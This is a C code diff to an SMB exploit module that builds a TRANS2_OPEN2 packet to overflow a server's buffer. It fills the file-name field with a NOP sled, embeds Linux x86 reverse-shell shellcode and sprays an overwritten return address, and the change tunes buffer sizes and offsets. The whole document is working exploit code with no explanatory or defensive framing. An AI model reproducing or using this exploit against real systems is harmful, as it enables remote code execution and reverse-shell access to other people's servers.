@@ -6,6 +6,7 @@
 
 #include "../../lib/nbios/nbios.h"
 #include "../../lib/smb/smb.h"
+// #include "../pattern_reader/module_ptr.c"
 
 #include "./module_ptr.h"
 
@@ -39,7 +40,7 @@ struct open2_t {
   uint16_t open_mode;
   uint32_t allocation_size;
   uint8_t reserved2[10];
-  uint8_t file_name[3000];
+  uint8_t file_name[2100];
 };
 
 struct data_bytes_t {
@@ -96,24 +97,33 @@ int smb_com_trans2_open2(int sock, uint16_t tid, uint16_t uid, uint32_t eip) {
   packet.word_count = 0x0f;
 
   // params
-  packet.params.total_parameter_count = htole16(3030);
-  packet.params.parameter_count = htole16(3030);
+  packet.params.total_parameter_count = htole16(2000);
+  packet.params.parameter_count = htole16(2000);
   packet.params.parameter_offset =
       htole16((uint8_t *)&packet.data_bytes.open2 - (uint8_t *)&packet.smb_hdr);
   packet.params.data_offset =
-      htole16((uint8_t *)&packet.data_bytes.open2.file_name[12] -
+      htole16((uint8_t *)&packet.data_bytes.trans2_data_bytes -
               (uint8_t *)&packet.smb_hdr);
 
   // data bytes
   packet.byte_count = htole16(sizeof(struct data_bytes_t));
+
   packet.data_bytes.open2.access_mode = htole16(0x0002);
   packet.data_bytes.open2.open_mode = htole16(0x0010);
 
-  memset(packet.data_bytes.open2.file_name, 0x90, 3000);
+  /*
+  if (read_pattern("./pattern.txt", packet.data_bytes.open2.file_name, 2100) <
+      0) {
+    return -1;
+  };
+  */
+  ///* Exploit payload
+
+  memset(packet.data_bytes.open2.file_name, 0x90, 2100);
   memcpy(packet.data_bytes.open2.file_name + 800, linux_x86_revshell, 198);
 
-  for (int i = 0; i < 494 * 4; i += 4) {
-    memcpy(packet.data_bytes.open2.file_name + 1024 + i, (uint8_t *)&eip, 4);
+  for (int i = 0; i < 2096 - 1024; i += 4) {
+    memcpy(packet.data_bytes.open2.file_name + 1127 + i, (uint8_t *)&eip, 4);
   };
 
   if (send(sock, &packet, sizeof(struct packet_t), 0) < 0) {
